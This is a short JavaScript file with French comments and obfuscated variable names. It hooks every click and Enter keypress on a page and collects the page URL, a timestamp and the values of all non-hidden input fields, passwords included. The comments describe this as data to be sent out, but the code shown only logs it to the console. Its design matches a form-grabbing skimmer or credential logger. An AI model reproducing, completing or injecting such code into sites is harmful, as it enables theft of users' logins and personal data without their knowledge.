"use strict";

/*************************************************************/
/*            DE 1001->1010 variables temporaires            */
/* clef1000 = liste de tout les input                        */
/* clef1001 = compteur temporaire                            */
/* clef1002 = site visité                                    */
/* clef1003 = liste avec les values des input                */
/* clef1004 = objet Date()                                   */
/*             DE 1011->1021 variables à envoyer             */
/* clef1011 = liste avec toutes les info à envoyer           */
/* clef1011 = [[site visité],[tous les input de la page]]    */
/* clef1007 =                                                */
/* clef1008 =                                                */
/* clef1009 =                                                */
/*************************************************************/

document.addEventListener('click', funct1000);
document.addEventListener("keydown", funct1001);

function funct1000(){
	var clef1002 = document.location.href;
	var clef1003 = [];
	var clef1000 = Array.prototype.slice.call(document.getElementsByTagName('input'),0)
	for (let clef1001=0; clef1001!=clef1000.length ; clef1001++){
		if (clef1000[clef1001].getAttribute("type") != "hidden"){
			clef1003.push(clef1000[clef1001].value);
		}
	}
	const clef1004 = new Date();
	var clef1011 = [clef1004.getDate()+"/"+(clef1004.getMonth()+1)+"/"+(clef1004.getYear()+1900)+" | "+clef1004.getHours()+":"+clef1004.getMinutes()];
	clef1011.push(clef1002);
	clef1011.push(clef1003);
	console.log(clef1011);
}

function funct1001(event){
	if (event.keyCode == 13){
    	funct1000()
  }
}
